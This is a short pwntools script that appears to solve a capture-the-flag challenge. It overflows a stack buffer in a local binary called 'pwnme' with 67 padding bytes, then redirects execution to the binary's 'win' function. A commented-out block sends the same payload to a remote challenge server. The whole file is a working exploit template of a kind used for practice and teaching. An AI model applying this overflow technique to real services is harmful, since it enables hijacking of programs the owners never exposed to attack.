#!/usr/bin/python3

from pwn import *

e = ELF('./pwnme')
return_address = e.symbols['win']

offset = 67

payload = offset * b'A'
payload += p32(return_address)

p = process('./pwnme')
p.sendline(payload)
p.interactive()
'''
conn = remote('0.cloud.chals.io',22209)
# conn.recvline()
conn.sendline(payload)
conn.interactive()
'''
